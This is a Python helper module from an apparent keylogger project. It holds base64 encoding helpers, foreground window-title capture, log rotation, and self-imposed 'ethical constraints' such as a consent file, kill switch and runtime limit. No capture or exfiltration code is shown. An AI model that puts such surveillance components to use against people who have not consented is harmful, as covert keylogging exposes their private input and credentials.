import os
import sys
import time
import base64
import psutil
import platform
from datetime import datetime, timedelta
from config import CONFIG, ETHICAL_CONSTRAINTS

def get_timestamp():
    """Get current timestamp"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def encode_data(data):
    """Encode data to base64"""
    return base64.b64encode(data.encode()).decode()

def decode_data(encoded_data):
    """Decode data from base64"""
    return base64.b64decode(encoded_data.encode()).decode()

def check_ethical_constraints():
    """Check if ethical constraints are met"""
    # Check for consent file
    if ETHICAL_CONSTRAINTS['REQUIRE_CONSENT_FILE']:
        if not os.path.exists('consent.txt'):
            print("⚠️  ETHICAL CONSTRAINT: consent.txt file required")
            print("Create a file named 'consent.txt' with your consent to proceed")
            return False
    
    return True

def check_kill_switch():
    """Check if kill switch is activated"""
    return os.path.exists(CONFIG['KILL_SWITCH_FILE'])

def create_kill_switch():
    """Create kill switch file"""
    with open(CONFIG['KILL_SWITCH_FILE'], 'w') as f:
        f.write(f"Kill switch activated at {get_timestamp()}")

def cleanup_old_logs():
    """Clean up old log files"""
    try:
        if os.path.exists(CONFIG['LOG_FILE']):
            file_age = datetime.now() - datetime.fromtimestamp(
                os.path.getctime(CONFIG['LOG_FILE'])
            )
            if file_age.days > CONFIG['LOG_RETENTION_DAYS']:
                os.remove(CONFIG['LOG_FILE'])
                print(f"Cleaned up old log file (age: {file_age.days} days)")
    except Exception as e:
        print(f"Error cleaning up logs: {e}")

def get_active_window_title():
    """Get the title of the active window (Windows specific)"""
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except ImportError:
        return "Unknown Window"
    except Exception:
        return "Unknown Window"

def is_sensitive_application():
    """Check if current application should be skipped"""
    try:
        current_process = psutil.Process().name().lower()
        sensitive_apps = [app.lower() for app in ETHICAL_CONSTRAINTS['DISABLE_SENSITIVE_APPS']]
        return current_process in sensitive_apps
    except Exception:
        return False

def log_warning(message):
    """Log warning message if enabled"""
    if ETHICAL_CONSTRAINTS['LOG_WARNING_MESSAGES']:
        timestamp = get_timestamp()
        warning_log = f"[WARNING {timestamp}] {message}\n"
        with open('warnings.log', 'a') as f:
            f.write(warning_log)

def check_runtime_limit(start_time):
    """Check if runtime limit is exceeded"""
    runtime_hours = (time.time() - start_time) / 3600
    if runtime_hours > ETHICAL_CONSTRAINTS['MAX_RUNTIME_HOURS']:
        log_warning(f"Runtime limit exceeded: {runtime_hours:.2f} hours")
        return True
    return False

def safe_exit(message="Keylogger terminated safely"):
    """Safely exit the application"""
    print(f"\n{message}")
    log_warning(message)
    create_kill_switch()
    sys.exit(0)
